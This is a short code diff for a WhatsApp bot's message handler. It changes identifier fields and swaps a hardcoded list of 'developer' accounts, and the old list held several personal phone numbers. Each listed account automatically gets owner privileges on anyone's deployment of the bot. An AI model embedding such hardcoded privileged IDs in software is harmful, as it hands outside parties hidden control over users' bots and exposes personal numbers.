@@ -331,17 +331,17 @@ const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLo
 const args = body.trim().split(/ +/).slice(1)
 const q = args.join(' ')
 const isGroup = from.endsWith('@g.us')
-const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+const sender = mek.key.fromMe ? (conn.user.lid.split(':')[0] + '@lid' || conn.user.lid) : (mek.key.participant || mek.key.remoteJid)
 const senderNumber = sender.split('@')[0]
-const botNumber = conn.user.id.split(':')[0]
+const botNumber = conn.user.lid.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94724375368,94722617699,94788518429,94787318729,94742524701,94716769285,94711451319,94719255382`
+const developers = `107593779404949,203367389343836`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
 const isMe = isbot ? isbot : isdev 
 const isOwner = ownerNumber.includes(senderNumber) || isMe
-const botNumber2 = await jidNormalizedUser(conn.user.id);
+const botNumber2 = await jidNormalizedUser(conn.user.lid);
 const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
 const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
 const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
@@ -356,7 +356,6 @@ if(getdata[i] === from) return true
 }
 return false
 }
-
 
 
 
